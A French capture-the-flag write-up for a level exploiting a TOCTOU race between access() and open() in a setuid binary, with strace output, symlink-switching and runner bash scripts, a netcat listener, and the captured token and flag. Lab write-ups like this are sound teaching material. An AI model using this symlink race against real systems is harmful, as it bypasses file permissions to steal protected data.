# Niveau 10 - Exploiter une vulnérabilité TOCTOU

## Vulnérabilité

Ce niveau exploite une vulnérabilité de condition de concurrence (race condition) de type Time-of-Check-to-Time-of-Use (TOCTOU).

## Découverte & Analyse

En analysant le binaire avec `strace`, nous observons la séquence suivante d'appels système :
```bash
access("test2", R_OK) = 0
...
write(1, "Connecting to 192.168.122.99:696"..., 37Connecting to 192.168.122.99:6969 .. ) = 37
socket(AF_INET, SOCK_STREAM, IPPROTO_IP) = 3
connect(3, {sa_family=AF_INET, sin_port=htons(6969), sin_addr=inet_addr("192.168.122.99")}, 16) = 0
write(3, ".*( )*.\n", 8) = 8
write(1, "Connected!\n", 11Connected!
) = 11
write(1, "Sending file .. ", 16Sending file .. ) = 16
openat(AT_FDCWD, "test2", O_RDONLY) = 4
```
La vulnérabilité clé est l'intervalle de temps entre la vérification des permissions (`access()`) et l'ouverture réelle du fichier (`open()`). Si nous pouvons changer ce vers quoi pointe le chemin du fichier pendant cet intervalle, nous pouvons lire des fichiers auxquels nous n'avons pas la permission d'accéder.

## Méthode d'Exploitation

### Étape 1 : Créer les fichiers nécessaires

```bash
touch /tmp/myfile
chmod 777 /tmp/myfile

nano /tmp/switcher.sh
```

Contenu de `/tmp/switcher.sh`:
```bash
#!/bin/bash

while true; do
  # Basculer le lien symbolique vers /tmp/myfile
  ln -sf /tmp/myfile /tmp/linkfile

  # Basculer le lien symbolique vers le fichier token
  ln -sf /home/user/level10/token /tmp/linkfile
done
```

- `ln` : Crée des liens entre les fichiers.
- `-s` : Crée un lien symbolique (symlink) au lieu d'un lien physique. Un lien symbolique est comme un raccourci qui pointe vers un autre fichier. Ils sont utiles ici car ils peuvent être rapidement redirigés pour pointer vers différents fichiers.
- `-f` : Option "force". Si le fichier cible existe déjà, le supprime avant de créer le lien. Cela évite les messages d'erreur concernant les fichiers déjà existants.

```bash
nano /tmp/runner.sh
```

Contenu de `/tmp/runner.sh`:
```bash
#!/bin/bash

while true; do
  # Exécuter le programme level10
  /home/user/level10/level10 /tmp/linkfile 127.0.0.1
done
```

Rendre les scripts exécutables :
```bash
chmod +x /tmp/switcher.sh
chmod +x /tmp/runner.sh
```

### Étape 2 : Mettre en place un écouteur et exécuter les scripts

Dans trois terminaux séparés, exécutez :

```bash
# Terminal 1 : Démarrer un écouteur netcat
nc -kl 6969

# Terminal 2 : Exécuter le programme en boucle
/tmp/runner.sh

# Terminal 3 : Basculer les liens en boucle
/tmp/switcher.sh
```

- `nc` est l'utilitaire netcat, un outil réseau polyvalent.
- `-l` met netcat en mode "écoute", le faisant agir comme un serveur.
- L'option additionnelle `-k` maintient l'écouteur actif après la déconnexion d'un client.
- `6969` est le numéro de port sur lequel écouter.

Après avoir exécuté l'exploit, nous avons capturé le jeton du fichier `token` sur l'écouteur `nc`:

```
woupa2yuojeeaaed06riuj63c
```

Nous avons utilisé ce jeton pour nous connecter en tant qu'utilisateur `flag10` :

```bash
su flag10
# Entrez le jeton comme mot de passe
getflag
# Sortie : Check flag.Here is your token : feulo4b72j7edeahuete3no7c
```

## Explication

L'exploit fonctionne car :

1. Lorsque `level10` appelle `access()`, notre lien symbolique pointe vers `/tmp/myfile` auquel nous pouvons accéder.
2. Avant que `level10` n'appelle `open()`, notre script change rapidement le lien symbolique pour pointer vers le fichier `token`.
3. Lorsque `open()` est appelé, il ouvre le fichier `token` à la place, contournant la vérification de permission.
4. Le contenu est envoyé à notre écouteur netcat.

C'est une vulnérabilité classique de condition de concurrence où l'état du système change entre la vérification des permissions et l'exécution d'une opération.
